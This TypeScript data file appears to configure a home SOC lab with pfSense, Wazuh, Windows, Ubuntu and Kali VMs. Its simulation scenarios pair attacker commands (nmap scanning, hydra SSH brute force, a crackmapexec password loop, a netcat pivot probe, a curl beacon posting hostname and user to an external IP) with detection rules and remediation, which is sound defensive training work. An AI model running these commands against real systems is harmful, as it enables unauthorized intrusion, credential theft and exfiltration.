/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

export interface VirtualMachine {
  id: string;
  name: string;
  role: string;
  os: string;
  hostname: string;
  ip: string;
  subnet: string;
  mac?: string;
  adapters: {
    slot: number;
    type: 'NAT' | 'Bridged' | 'Internal' | 'Host-Only';
    networkName?: string;
    ipAssignment: 'Static' | 'DHCP' | 'WAN ISP';
    description: string;
  }[];
  hardware: {
    minRam: number; // in MB
    recRam: number;
    highRam: number;
    vCpu: number;
    diskGb: number;
  };
  downloads: {
    title: string;
    url: string;
    checksum?: string;
    license: 'Free / Open Source' | '90-Day Free Evaluation' | 'Free Community Edition';
    fileType: 'ISO' | 'OVA' | 'ZIP';
  }[];
  services: string[];
  description: string;
}

export interface SubnetConfig {
  id: string;
  name: string;
  purpose: string;
  cidr: string;
  gateway: string;
  netmask: string;
  dhcpRange?: string;
  dnsServer: string;
  vlanTag?: number;
  firewallZone: string;
  securityPolicy: string;
}

export interface SecurityScenario {
  id: string;
  title: string;
  category: 'Reconnaissance' | 'Credential Access' | 'Command and Control' | 'Lateral Movement' | 'Exfiltration';
  mitreId: string;
  mitreTactic: string;
  severity: 'Critical' | 'High' | 'Medium' | 'Low';
  severityScore: number;
  concept: string;
  prerequisites: string;
  kaliCommand: string;
  commandBreakdown: { flag: string; explanation: string }[];
  target: string;
  expectedLogSource: 'pfSense filterlog' | 'Linux /var/log/auth.log' | 'Windows Security Event 4625' | 'Sysmon Event 1 & 3' | 'Wazuh Active Response';
  rawLogSample: string;
  wazuhRuleId: number;
  wazuhRuleXml: string;
  wazuhAlertJson: Record<string, any>;
  containmentSteps: string[];
  remediationSteps: string[];
}

export interface TestCase {
  id: string;
  objective: string;
  procedure: string;
  verificationCommand: string;
  expectedResult: string;
  actualResult: string;
  status: 'Passed' | 'Pending' | 'Failed';
  phase: string;
}

export const SUBNETS: SubnetConfig[] = [
  {
    id: 'wan',
    name: 'WAN (Simulated External / ISP)',
    purpose: 'Provides upstream Internet access for package downloads and external simulation space.',
    cidr: '192.168.1.0/24 (or Host NAT 10.0.2.0/24)',
    gateway: 'VirtualBox Default Gateway',
    netmask: '255.255.255.0',
    dhcpRange: 'Dynamic from VirtualBox NAT / Host Router',
    dnsServer: '1.1.1.1, 8.8.8.8',
    firewallZone: 'WAN',
    securityPolicy: 'Default Deny Inbound; Egress allowed with NAT overload (PAT).'
  },
  {
    id: 'lan',
    name: 'LAN (Internal Corporate Segment)',
    purpose: 'Houses trusted enterprise assets: Wazuh SIEM Manager, Ubuntu internal server, Windows evaluation workstation/server.',
    cidr: '192.168.10.0/24',
    gateway: '192.168.10.1 (pfSense em1)',
    netmask: '255.255.255.0',
    dhcpRange: '192.168.10.100 - 192.168.10.199 (Static servers .10 - .50)',
    dnsServer: '192.168.10.1 (pfSense Unbound DNS)',
    firewallZone: 'LAN',
    securityPolicy: 'Allowed outbound to WAN (HTTP/HTTPS/DNS). Strict blocked inbound from DMZ and WAN.'
  },
  {
    id: 'dmz',
    name: 'DMZ (Demilitarized Perimeter)',
    purpose: 'Houses semi-trusted services exposed to testing/external traffic (e.g., Apache/Nginx web server). Segregated from internal LAN.',
    cidr: '192.168.20.0/24',
    gateway: '192.168.20.1 (pfSense em2)',
    netmask: '255.255.255.0',
    dhcpRange: '192.168.20.50 - 192.168.20.99',
    dnsServer: '192.168.20.1',
    firewallZone: 'DMZ',
    securityPolicy: 'Strict isolation: DMZ is explicitly forbidden from initiating connections to LAN (192.168.10.0/24).'
  },
  {
    id: 'attacker_net',
    name: 'Attacker Network (Testing Zone)',
    purpose: 'Dedicated staging subnet for Kali Linux to launch simulated scans, brute-force attacks, and rogue telemetry into the DMZ/Firewall.',
    cidr: '192.168.1.0/24 or Host NAT Network',
    gateway: '192.168.1.1',
    netmask: '255.255.255.0',
    dhcpRange: '192.168.1.50 (Static)',
    dnsServer: '1.1.1.1',
    firewallZone: 'External Untrusted',
    securityPolicy: 'Treat as hostile untrusted zone. Inbound traffic blocked by pfSense WAN unless explicitly NAT port-forwarded.'
  }
];

export const VIRTUAL_MACHINES: VirtualMachine[] = [
  {
    id: 'pfsense',
    name: 'pfSense 2.7.2 CE Firewall / Router',
    role: 'Perimeter Firewall, Inter-VLAN Routing, DHCP Server, DNS Resolver & Central Packet Filter',
    os: 'FreeBSD 14-based pfSense CE',
    hostname: 'pfsense.enterprise.lab',
    ip: 'WAN: DHCP | LAN: 192.168.10.1 | DMZ: 192.168.20.1',
    subnet: 'Gateway for all segments',
    adapters: [
      { slot: 1, type: 'NAT', ipAssignment: 'DHCP', description: 'WAN Interface (em0) - Connects to virtual NAT for upstream Internet' },
      { slot: 2, type: 'Internal', networkName: 'intnet-lan', ipAssignment: 'Static', description: 'LAN Interface (em1) - 192.168.10.1/24 Gateway' },
      { slot: 3, type: 'Internal', networkName: 'intnet-dmz', ipAssignment: 'Static', description: 'DMZ Interface (em2) - 192.168.20.1/24 Gateway' }
    ],
    hardware: {
      minRam: 1024,
      recRam: 1536,
      highRam: 2048,
      vCpu: 1,
      diskGb: 20
    },
    downloads: [
      {
        title: 'pfSense Community Edition 2.7.2 (AMD64 ISO)',
        url: 'https://www.pfsense.org/download/',
        license: 'Free / Open Source',
        fileType: 'ISO'
      }
    ],
    services: ['pf (Packet Filter)', 'Unbound DNS Resolver', 'ISC DHCP Server', 'Syslog Daemon', 'WebGUI (HTTPS 443)'],
    description: 'Enforces stateful network segmentation, prevents unauthorized DMZ-to-LAN pivots, forwards syslog to Wazuh SIEM, and manages IP routing.'
  },
  {
    id: 'wazuh',
    name: 'Wazuh 4.9 SIEM & XDR Manager',
    role: 'Centralized Security Information and Event Management (SIEM), Log Ingestion, Alert Indexing & Dashboard',
    os: 'Ubuntu 22.04 LTS (or Wazuh Ready OVA)',
    hostname: 'wazuh-siem.enterprise.lab',
    ip: '192.168.10.10',
    subnet: 'LAN (192.168.10.0/24)',
    adapters: [
      { slot: 1, type: 'Internal', networkName: 'intnet-lan', ipAssignment: 'Static', description: 'Primary NIC - Attached to intnet-lan (192.168.10.10/24)' }
    ],
    hardware: {
      minRam: 3072,
      recRam: 4096,
      highRam: 6144,
      vCpu: 2,
      diskGb: 50
    },
    downloads: [
      {
        title: 'Wazuh Ready-to-use Virtual Appliance (OVA) or Ubuntu Server 22.04',
        url: 'https://documentation.wazuh.com/current/deployment-options/virtual-machine/virtual-machine.html',
        license: 'Free / Open Source',
        fileType: 'OVA'
      },
      {
        title: 'Ubuntu Server 22.04.4 LTS ISO',
        url: 'https://releases.ubuntu.com/jammy/',
        license: 'Free / Open Source',
        fileType: 'ISO'
      }
    ],
    services: ['Wazuh Manager (Ports 1514/1515)', 'Wazuh Indexer (Port 9200)', 'Wazuh Dashboard (HTTPS 443/5601)', 'Filebeat'],
    description: 'Collects syslog from pfSense, endpoint telemetry via Wazuh agents on Ubuntu and Windows, correlates events against MITRE ATT&CK rules, and powers SOC dashboards.'
  },
  {
    id: 'ubuntu_srv',
    name: 'Ubuntu 22.04 LTS Enterprise Server',
    role: 'Internal Corporate File/App Server, Monitored Linux Endpoint, Wazuh Agent Host',
    os: 'Ubuntu 22.04 Server',
    hostname: 'srv-app01.enterprise.lab',
    ip: '192.168.10.20',
    subnet: 'LAN (192.168.10.0/24)',
    adapters: [
      { slot: 1, type: 'Internal', networkName: 'intnet-lan', ipAssignment: 'Static', description: 'Primary NIC - Attached to intnet-lan (192.168.10.20/24)' }
    ],
    hardware: {
      minRam: 1024,
      recRam: 1536,
      highRam: 2048,
      vCpu: 1,
      diskGb: 25
    },
    downloads: [
      {
        title: 'Ubuntu Server 22.04.4 LTS ISO',
        url: 'https://releases.ubuntu.com/jammy/',
        license: 'Free / Open Source',
        fileType: 'ISO'
      }
    ],
    services: ['OpenSSH (Port 22)', 'Nginx / App Demo (Port 80)', 'Wazuh Agent Daemon', 'Auditd'],
    description: 'Simulates corporate internal infrastructure. Target for SSH brute-force testing and internal log telemetry verification.'
  },
  {
    id: 'windows_ep',
    name: 'Windows Server / Workstation (Eval)',
    role: 'Monitored Enterprise Endpoint with Sysmon Deep Telemetry & Event Viewer Auditing',
    os: 'Windows Server 2022 Eval or Windows 10/11 Enterprise Eval',
    hostname: 'win-client01.enterprise.lab',
    ip: '192.168.10.30',
    subnet: 'LAN (192.168.10.0/24)',
    adapters: [
      { slot: 1, type: 'Internal', networkName: 'intnet-lan', ipAssignment: 'DHCP', description: 'Primary NIC - Attached to intnet-lan (192.168.10.30/24)' }
    ],
    hardware: {
      minRam: 2048,
      recRam: 3072,
      highRam: 4096,
      vCpu: 2,
      diskGb: 40
    },
    downloads: [
      {
        title: 'Microsoft Windows Server 2022 Evaluation (180 days free)',
        url: 'https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022',
        license: '90-Day Free Evaluation',
        fileType: 'ISO'
      },
      {
        title: 'Microsoft Windows 10/11 Enterprise Evaluation (90 days free)',
        url: 'https://www.microsoft.com/en-us/evalcenter/evaluate-windows-11-enterprise',
        license: '90-Day Free Evaluation',
        fileType: 'ISO'
      },
      {
        title: 'Microsoft Sysinternals Sysmon v15+',
        url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon',
        license: 'Free / Open Source',
        fileType: 'ZIP'
      },
      {
        title: 'SwiftOnSecurity Sysmon Modular Configuration',
        url: 'https://github.com/SwiftOnSecurity/sysmon-config',
        license: 'Free / Open Source',
        fileType: 'ZIP'
      }
    ],
    services: ['Windows Event Log', 'Sysmon Driver', 'Wazuh Agent Service', 'Windows Remote Management'],
    description: 'Generates critical endpoint telemetry: Process execution (Event ID 1), Network connections (Event ID 3), and Security logon failures (Event ID 4625).'
  },
  {
    id: 'dmz_web',
    name: 'DMZ Public Web Server (Ubuntu/Debian)',
    role: 'Perimeter Web Server in Segregated DMZ Segment (Target for Reconnaissance & Pivot Tests)',
    os: 'Ubuntu Server 22.04 or Alpine Linux',
    hostname: 'dmz-web.enterprise.lab',
    ip: '192.168.20.10',
    subnet: 'DMZ (192.168.20.0/24)',
    adapters: [
      { slot: 1, type: 'Internal', networkName: 'intnet-dmz', ipAssignment: 'Static', description: 'Primary NIC - Attached to intnet-dmz (192.168.20.10/24)' }
    ],
    hardware: {
      minRam: 512,
      recRam: 1024,
      highRam: 1024,
      vCpu: 1,
      diskGb: 15
    },
    downloads: [
      {
        title: 'Ubuntu Server 22.04 LTS (or Alpine Linux for lightweight 512MB RAM)',
        url: 'https://alpinelinux.org/downloads/',
        license: 'Free / Open Source',
        fileType: 'ISO'
      }
    ],
    services: ['Apache2/Nginx (Port 80/443)', 'Wazuh Agent (optional or syslog)'],
    description: 'Perimeter asset placed in DMZ. Used to validate that pfSense strictly forbids DMZ assets from pivoting into LAN.'
  },
  {
    id: 'kali',
    name: 'Kali Linux 2024 Attacker / Tester VM',
    role: 'Authorized Penetration Testing, Attack Emulation & SOC Detection Validation Platform',
    os: 'Kali Linux 2024.x Rolling (64-bit)',
    hostname: 'kali-secops.lab',
    ip: '192.168.1.50 or Host NAT',
    subnet: 'External WAN / Test Staging Network',
    adapters: [
      { slot: 1, type: 'NAT', ipAssignment: 'DHCP', description: 'NAT Network / Bridged - Used to reach pfSense WAN or test interfaces' }
    ],
    hardware: {
      minRam: 1536,
      recRam: 2048,
      highRam: 4096,
      vCpu: 2,
      diskGb: 30
    },
    downloads: [
      {
        title: 'Kali Linux Pre-built VirtualBox Image (.7z / .vbox)',
        url: 'https://www.kali.org/get-kali/#kali-virtual-machines',
        license: 'Free / Open Source',
        fileType: 'OVA'
      }
    ],
    services: ['Nmap 7.94+', 'Hydra', 'Wireshark / Tshark', 'Metasploit Framework', 'Python3 Scapy', 'Dig / Netcat'],
    description: 'Simulates external and internal adversaries in a strictly isolated sandbox to generate realistic telemetry for SIEM detection validation.'
  }
];

export const SECURITY_SCENARIOS: SecurityScenario[] = [
  {
    id: 'sim-01',
    title: 'Nmap TCP SYN Port Reconnaissance',
    category: 'Reconnaissance',
    mitreId: 'T1046',
    mitreTactic: 'Discovery',
    severity: 'Medium',
    severityScore: 6,
    concept: 'Adversaries scan network IP ranges and ports to identify open listening services, operating systems, and exploitable software versions prior to attack.',
    prerequisites: 'Kali VM connected; target Ubuntu Server (192.168.10.20) running SSH and HTTP.',
    kaliCommand: 'sudo nmap -sS -sV -p 21,22,80,443,3389 192.168.10.20 --reason -oN nmap_recon.txt',
    commandBreakdown: [
      { flag: 'sudo', explanation: 'Root privileges required for raw socket access to craft half-open SYN packets.' },
      { flag: '-sS', explanation: 'TCP SYN stealth scan (sends SYN, receives SYN-ACK, responds with RST without completing 3-way handshake).' },
      { flag: '-sV', explanation: 'Version detection: probes open ports to determine service banner and application version.' },
      { flag: '-p 21,22,80,443,3389', explanation: 'Explicit port list covering FTP, SSH, HTTP, HTTPS, and RDP.' },
      { flag: '--reason', explanation: 'Displays the TCP flag response justifying why the port is determined open or closed.' }
    ],
    target: '192.168.10.20 (Ubuntu Server)',
    expectedLogSource: 'pfSense filterlog',
    rawLogSample: 'filterlog: 4,,,1000000103,em1,match,block,in,4,0x0,,64,0,0,DF,6,tcp,44,192.168.1.50,192.168.10.20,54128,3389,0,S,1024567,,1024,,',
    wazuhRuleId: 87701,
    wazuhRuleXml: `<rule id="87701" level="6">\n  <if_sid>4300</if_sid>\n  <field name="firewall.action">block</field>\n  <description>pfSense: Inbound port scan connection blocked</description>\n  <mitre>\n    <id>T1046</id>\n  </mitre>\n</rule>`,
    wazuhAlertJson: {
      timestamp: '2026-11-03T09:30:15.112+0000',
      rule: {
        id: '87701',
        level: 6,
        description: 'pfSense: Inbound port scan connection blocked',
        mitre: { id: ['T1046'], tactic: ['Discovery'] }
      },
      agent: { id: '001', name: 'pfsense-firewall' },
      data: {
        srcip: '192.168.1.50',
        dstip: '192.168.10.20',
        dstport: '3389',
        proto: 'TCP',
        action: 'block'
      }
    },
    containmentSteps: [
      'Verify whether firewall automatically blocked or if target accepted SYN packets.',
      'Check pfSense snort/suricata package or dynamic block table.',
      'Add offending IP (192.168.1.50) to pfSense WAN drop alias if external.'
    ],
    remediationSteps: [
      'Ensure unnecessary management ports (e.g. RDP, SSH) are bound only to internal management subnets.',
      'Configure fail2ban or Wazuh active-response script on the Linux host.'
    ]
  },
  {
    id: 'sim-02',
    title: 'SSH Brute-Force Password Spray',
    category: 'Credential Access',
    mitreId: 'T1110.001',
    mitreTactic: 'Credential Access',
    severity: 'High',
    severityScore: 10,
    concept: 'Automated trial-and-error attempts using dictionary wordlists to guess SSH login passwords against valid user accounts (e.g., ubuntu, root, admin).',
    prerequisites: 'SSH running on Ubuntu Server (192.168.10.20); wordlist created on Kali.',
    kaliCommand: 'hydra -l ubuntu -P /usr/share/wordlists/fasttrack.txt ssh://192.168.10.20 -t 4 -vV',
    commandBreakdown: [
      { flag: 'hydra', explanation: 'Fast network logon cracking tool.' },
      { flag: '-l ubuntu', explanation: 'Specifies targeted username to brute-force.' },
      { flag: '-P .../fasttrack.txt', explanation: 'Path to password dictionary wordlist.' },
      { flag: 'ssh://192.168.10.20', explanation: 'Protocol and target host destination.' },
      { flag: '-t 4', explanation: 'Number of parallel worker threads (kept at 4 to simulate controlled lab traffic).' },
      { flag: '-vV', explanation: 'Verbose output displaying login attempts in real time.' }
    ],
    target: '192.168.10.20 (Ubuntu OpenSSH)',
    expectedLogSource: 'Linux /var/log/auth.log',
    rawLogSample: 'Nov 03 09:34:22 srv-app01 sshd[14221]: Failed password for invalid user admin from 192.168.1.50 port 48922 ssh2',
    wazuhRuleId: 5712,
    wazuhRuleXml: `<rule id="5712" level="10" frequency="6" timeframe="120">\n  <if_matched_sid>5710</if_matched_sid>\n  <same_source_ip />\n  <description>sshd: Multiple failed SSH authentication attempts from same IP (Brute-Force suspected)</description>\n  <mitre>\n    <id>T1110.001</id>\n  </mitre>\n</rule>`,
    wazuhAlertJson: {
      timestamp: '2026-11-03T09:34:25.802+0000',
      rule: {
        id: '5712',
        level: 10,
        description: 'sshd: Multiple failed SSH authentication attempts from same IP (Brute-Force suspected)',
        mitre: { id: ['T1110.001'], tactic: ['Credential Access'] }
      },
      agent: { id: '002', name: 'srv-app01' },
      data: {
        srcip: '192.168.1.50',
        dstuser: 'admin',
        dstport: '22',
        failure_count: 8
      }
    },
    containmentSteps: [
      'Execute Wazuh Active Response firewall-drop script to instantly blackhole 192.168.1.50 for 600 seconds.',
      'Check /var/log/auth.log to confirm if any attempted password succeeded.'
    ],
    remediationSteps: [
      'Disable SSH password authentication entirely in /etc/ssh/sshd_config (PasswordAuthentication no).',
      'Enforce SSH Ed25519 public key authentication.',
      'Disable root direct login (PermitRootLogin no).'
    ]
  },
  {
    id: 'sim-03',
    title: 'Windows Security Event 4625 (Failed Logon Spike)',
    category: 'Credential Access',
    mitreId: 'T1110',
    mitreTactic: 'Credential Access',
    severity: 'High',
    severityScore: 9,
    concept: 'Multiple consecutive failed Windows NTLM/Kerberos authentication requests against local administrator accounts or network shares.',
    prerequisites: 'Windows VM (192.168.10.30) with Windows Event Auditing enabled for Logon/Logoff.',
    kaliCommand: 'for p in Admin123 Password1! Welcome2026 Winter#99; do crackmapexec smb 192.168.10.30 -u Administrator -p "$p"; sleep 1; done',
    commandBreakdown: [
      { flag: 'crackmapexec smb', explanation: 'Swiss army knife for testing Windows network authentication via SMB port 445.' },
      { flag: '-u Administrator', explanation: 'Target Windows account name.' },
      { flag: '-p "$p"', explanation: 'Iterates through simulated bad passwords to trigger Event 4625.' },
      { flag: 'sleep 1', explanation: 'Paces requests cleanly in the virtual environment.' }
    ],
    target: '192.168.10.30 (Windows Client / Server)',
    expectedLogSource: 'Windows Security Event 4625',
    rawLogSample: 'Microsoft-Windows-Security-Auditing: An account failed to log on. Subject: Security ID: S-1-0-0, Account Name: -, Logon Type: 3, Status: 0xC000006D, Sub Status: 0xC000006A, Workstation Name: KALI-SECOPS',
    wazuhRuleId: 60122,
    wazuhRuleXml: `<rule id="60122" level="9" frequency="5" timeframe="60">\n  <if_matched_sid>60106</if_matched_sid>\n  <same_source_ip />\n  <description>Multiple Windows logon failures (Event ID 4625) from same source IP</description>\n  <mitre>\n    <id>T1110</id>\n  </mitre>\n</rule>`,
    wazuhAlertJson: {
      timestamp: '2026-11-03T09:38:10.450+0000',
      rule: {
        id: '60122',
        level: 9,
        description: 'Multiple Windows logon failures (Event ID 4625) from same source IP',
        mitre: { id: ['T1110'], tactic: ['Credential Access'] }
      },
      agent: { id: '003', name: 'win-client01' },
      data: {
        win: {
          system: { eventID: '4625', channel: 'Security' },
          eventdata: {
            targetUserName: 'Administrator',
            ipAddress: '192.168.1.50',
            logonType: '3',
            status: '0xc000006d'
          }
        }
      }
    },
    containmentSteps: [
      'Verify if account lockout policy triggered (Event ID 4740 - A user account was locked out).',
      'Check if any valid sessions exist from the offending source IP.'
    ],
    remediationSteps: [
      'Enforce Group Policy Account Lockout Threshold (e.g. 5 invalid attempts locks account for 30 minutes).',
      'Deploy Sysmon to monitor what process initiated SMB binding.'
    ]
  },
  {
    id: 'sim-04',
    title: 'Suspicious DNS Request / Simulated C2 Beacon',
    category: 'Command and Control',
    mitreId: 'T1071.004',
    mitreTactic: 'Command and Control',
    severity: 'High',
    severityScore: 8,
    concept: 'Malware frequently queries dynamically generated domains (DGA) or known malicious DNS staging names to obtain command-and-control server IP addresses.',
    prerequisites: 'Ubuntu or Windows client configured to use pfSense (192.168.10.1) as DNS server.',
    kaliCommand: 'dig @192.168.10.1 evil-c2-beacon-data-exfil.xyz +short',
    commandBreakdown: [
      { flag: 'dig', explanation: 'DNS lookup utility.' },
      { flag: '@192.168.10.1', explanation: 'Directs the query directly to internal pfSense Unbound DNS resolver.' },
      { flag: 'evil-c2-beacon...', explanation: 'High-entropy or flagged domain name matching SIEM threat intelligence IOCs.' }
    ],
    target: '192.168.10.1 (pfSense DNS Resolver)',
    expectedLogSource: 'Sysmon Event 1 & 3',
    rawLogSample: 'Sysmon EventID 22: Dns query: RuleName: Suspicious_TLD, ProcessId: 4812, QueryName: evil-c2-beacon-data-exfil.xyz, QueryStatus: 0, Image: C:\\Windows\\System32\\nslookup.exe',
    wazuhRuleId: 92305,
    wazuhRuleXml: `<rule id="92305" level="8">\n  <if_sid>61600</if_sid>\n  <field name="win.eventdata.queryName">evil-c2-beacon</field>\n  <description>Sysmon: Suspicious DNS Query to potential C2 / Exfiltration Domain</description>\n  <mitre>\n    <id>T1071.004</id>\n  </mitre>\n</rule>`,
    wazuhAlertJson: {
      timestamp: '2026-11-03T09:42:01.319+0000',
      rule: {
        id: '92305',
        level: 8,
        description: 'Sysmon: Suspicious DNS Query to potential C2 / Exfiltration Domain',
        mitre: { id: ['T1071.004'], tactic: ['Command and Control'] }
      },
      agent: { id: '003', name: 'win-client01' },
      data: {
        query: 'evil-c2-beacon-data-exfil.xyz',
        process_path: 'C:\\Windows\\System32\\nslookup.exe',
        parent_process: 'cmd.exe'
      }
    },
    containmentSteps: [
      'Sinkhole domain on pfSense DNS Resolver by pointing domain to 127.0.0.1.',
      'Isolate the querying workstation from the internal LAN network.'
    ],
    remediationSteps: [
      'Enable pfBlockerNG-devel on pfSense with Abuse.ch / URLhaus threat feeds.',
      'Enforce DNS-over-HTTPS (DoH) blocking so clients cannot bypass internal DNS inspection.'
    ]
  },
  {
    id: 'sim-05',
    title: 'Unauthorized DMZ-to-LAN Pivot Violation',
    category: 'Lateral Movement',
    mitreId: 'T1021',
    mitreTactic: 'Lateral Movement',
    severity: 'Critical',
    severityScore: 12,
    concept: 'If an adversary compromises a perimeter DMZ web server, they will attempt to pivot and scan internal corporate databases or the Wazuh SIEM.',
    prerequisites: 'Shell on DMZ Web Server (192.168.20.10); attempting connection to LAN (192.168.10.10).',
    kaliCommand: 'nc -zv 192.168.10.10 1514 -w 3',
    commandBreakdown: [
      { flag: 'nc (netcat)', explanation: 'Arbitrary TCP/UDP packet generator.' },
      { flag: '-z', explanation: 'Zero-I/O mode (scans for listening daemons without transmitting payload).' },
      { flag: '-v', explanation: 'Verbose output.' },
      { flag: '192.168.10.10 1514', explanation: 'Target Wazuh Server agent registration port on internal LAN.' },
      { flag: '-w 3', explanation: 'Timeout threshold of 3 seconds.' }
    ],
    target: '192.168.10.10 (Wazuh Manager in LAN)',
    expectedLogSource: 'pfSense filterlog',
    rawLogSample: 'filterlog: 4,,,1000000201,em2,match,block,in,4,0x0,,64,0,0,DF,6,tcp,44,192.168.20.10,192.168.10.10,48192,1514,0,S,2841029,,1024,,',
    wazuhRuleId: 87702,
    wazuhRuleXml: `<rule id="87702" level="12">\n  <if_sid>4300</if_sid>\n  <field name="firewall.srcip">^192\\.168\\.20\\.</field>\n  <field name="firewall.dstip">^192\\.168\\.10\\.</field>\n  <description>CRITICAL: Unauthorized DMZ to Internal LAN Lateral Pivot Blocked by Firewall</description>\n  <mitre>\n    <id>T1021</id>\n  </mitre>\n</rule>`,
    wazuhAlertJson: {
      timestamp: '2026-11-03T09:45:18.004+0000',
      rule: {
        id: '87702',
        level: 12,
        description: 'CRITICAL: Unauthorized DMZ to Internal LAN Lateral Pivot Blocked by Firewall',
        mitre: { id: ['T1021'], tactic: ['Lateral Movement'] }
      },
      agent: { id: '001', name: 'pfsense-firewall' },
      data: {
        srcip: '192.168.20.10',
        dstip: '192.168.10.10',
        dstport: '1514',
        action: 'block'
      }
    },
    containmentSteps: [
      'Confirm pfSense firewall rule successfully dropped the TCP SYN packet.',
      'Freeze snapshot of DMZ server for forensic memory dump.',
      'Check web server access logs for remote code execution (RCE) web shell indicators.'
    ],
    remediationSteps: [
      'Verify default-deny rule on DMZ interface in pfSense.',
      'Patch DMZ web service vulnerabilities and restrict user privileges.'
    ]
  },
  {
    id: 'sim-06',
    title: 'Unusual Outbound Connection (Egress Beaconing)',
    category: 'Exfiltration',
    mitreId: 'T1041',
    mitreTactic: 'Exfiltration',
    severity: 'High',
    severityScore: 9,
    concept: 'Compromised internal endpoint initiating outbound HTTP/TCP session over non-standard ports to an external suspicious IP address.',
    prerequisites: 'Windows or Linux VM on LAN initiating outbound curl or PowerShell WebRequest.',
    kaliCommand: 'curl -s -X POST http://198.51.100.4:8080/stage1 -d "hostname=$(hostname)&user=$(whoami)" -H "User-Agent: CobaltStrike-Beacon"',
    commandBreakdown: [
      { flag: 'curl -s', explanation: 'Silent HTTP client execution.' },
      { flag: '-X POST', explanation: 'Simulates exfiltration telemetry beacon.' },
      { flag: 'http://198.51.100.4:8080', explanation: 'External non-standard HTTP port.' },
      { flag: '-H User-Agent:...', explanation: 'Adversary C2 signature header recognized by IDS/SIEM signatures.' }
    ],
    target: 'External Simulated IP (198.51.100.4:8080)',
    expectedLogSource: 'Sysmon Event 1 & 3',
    rawLogSample: 'Sysmon EventID 3: Network connection detected: ProcessId: 5120, Image: /usr/bin/curl, SourceIp: 192.168.10.20, DestinationIp: 198.51.100.4, DestinationPort: 8080',
    wazuhRuleId: 92410,
    wazuhRuleXml: `<rule id="92410" level="9">\n  <if_sid>61603</if_sid>\n  <field name="win.eventdata.destinationPort">8080|8443|4444</field>\n  <description>Suspicious outbound high-port egress connection from internal corporate asset</description>\n  <mitre>\n    <id>T1041</id>\n  </mitre>\n</rule>`,
    wazuhAlertJson: {
      timestamp: '2026-11-03T09:49:55.771+0000',
      rule: {
        id: '92410',
        level: 9,
        description: 'Suspicious outbound high-port egress connection from internal corporate asset',
        mitre: { id: ['T1041'], tactic: ['Exfiltration'] }
      },
      agent: { id: '002', name: 'srv-app01' },
      data: {
        srcip: '192.168.10.20',
        dstip: '198.51.100.4',
        dstport: '8080',
        process_name: 'curl'
      }
    },
    containmentSteps: [
      'Kill offending process PID identified by Sysmon Event ID 1 / Auditd.',
      'Block destination IP (198.51.100.4) on pfSense Outbound rules.'
    ],
    remediationSteps: [
      'Enforce strict egress filtering: Allow only standard ports 80, 443, 53 outbound; block all high ports.',
      'Implement SSL/TLS inspection proxy.'
    ]
  }
];

export const TEST_CASES: TestCase[] = [
  {
    id: 'TC-NET-01',
    phase: 'Phase 3: Network Configuration',
    objective: 'Verify LAN to WAN Internet connectivity through pfSense NAT.',
    procedure: 'Execute ping to 1.1.1.1 from Ubuntu Server (192.168.10.20).',
    verificationCommand: 'ping -c 4 1.1.1.1',
    expectedResult: '0% packet loss, 4 packets transmitted, 4 received, round-trip ~15ms.',
    actualResult: '4 packets transmitted, 4 received, 0% packet loss, avg 14.8ms.',
    status: 'Passed'
  },
  {
    id: 'TC-NET-02',
    phase: 'Phase 3: Network Configuration',
    objective: 'Verify pfSense strictly blocks unauthorized DMZ to LAN connections.',
    procedure: 'Initiate TCP connection from DMZ Web (192.168.20.10) to Ubuntu SSH (192.168.10.20:22).',
    verificationCommand: 'nc -zv -w 3 192.168.10.20 22',
    expectedResult: 'Connection timed out / filtered. pfSense filterlog records block on em2.',
    actualResult: 'nc: connect to 192.168.10.20 port 22 (tcp) timed out: Operation now in progress.',
    status: 'Passed'
  },
  {
    id: 'TC-SIEM-01',
    phase: 'Phase 4: SIEM Installation',
    objective: 'Verify Wazuh Agent service registration and active heartbeat.',
    procedure: 'Check agent status on Wazuh Manager CLI.',
    verificationCommand: 'sudo /var/ossec/bin/agent_control -l',
    expectedResult: 'All enrolled agents (srv-app01, win-client01) report status: Active.',
    actualResult: 'ID: 001, Name: srv-app01, IP: 192.168.10.20, Status: Active. ID: 002, Name: win-client01, IP: 192.168.10.30, Status: Active.',
    status: 'Passed'
  },
  {
    id: 'TC-SEC-01',
    phase: 'Phase 5: Security Detection',
    objective: 'Verify detection and alerting of SSH Brute Force password spray.',
    procedure: 'Run hydra against srv-app01 with 10 failed passwords.',
    verificationCommand: 'sudo cat /var/ossec/logs/alerts/alerts.json | grep "5712" | tail -n 1',
    expectedResult: 'Alert Rule 5712 generated with Level 10 and MITRE T1110.001.',
    actualResult: 'Alert 5712 triggered: "sshd: Multiple failed SSH authentication attempts from same IP".',
    status: 'Passed'
  },
  {
    id: 'TC-SEC-02',
    phase: 'Phase 5: Security Detection',
    objective: 'Verify Windows Event 4625 ingestion into Wazuh Indexer.',
    procedure: 'Simulate 5 invalid Windows SMB logins from Kali using crackmapexec.',
    verificationCommand: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4625} -MaxEvents 5',
    expectedResult: '5 events logged in Windows Event Viewer; Wazuh Rule 60122 alerts triggered.',
    actualResult: '5 Security 4625 records parsed; Wazuh alert Level 9 fired within 12 seconds.',
    status: 'Passed'
  },
  {
    id: 'TC-AUTO-01',
    phase: 'Phase 8: Automation',
    objective: 'Verify Python security parser extracts offending IPs and outputs JSON report.',
    procedure: 'Execute parse_siem_alerts.py against exported alerts.json.',
    verificationCommand: 'python3 scripts/parse_siem_alerts.py --input sample_alerts.json --threshold 3',
    expectedResult: 'Offending IPs categorized, brute-force frequency calculated, output saved to incident_summary.json.',
    actualResult: 'Parsed 142 alerts. Flagged 192.168.1.50 with 14 failed events. Exported incident_summary.json (0 errors).',
    status: 'Passed'
  }
];

export const PYTHON_LOG_PARSER_SCRIPT = `#!/usr/bin/env python3
"""
Enterprise SIEM Log Parser & Automated Threat Triage
Author: Cybersecurity SOC Team
Target: Wazuh SIEM alerts.json & Sysmon Event Logs
"""

import json
import csv
import sys
from collections import defaultdict
from datetime import datetime

def analyze_security_logs(log_records, failed_login_threshold=5):
    print("=" * 65)
    print("ENTERPRISE SIEM LOG PARSER & INCIDENT TRIAGE ENGINE")
    print(f"Timestamp: {datetime.utcnow().isoformat()}Z")
    print("=" * 65)
    
    attacker_ip_counts = defaultdict(int)
    attack_categories = defaultdict(int)
    flagged_incidents = []
    
    for entry in log_records:
        rule = entry.get("rule", {})
        rule_id = rule.get("id")
        level = rule.get("level", 0)
        desc = rule.get("description", "Unknown Alert")
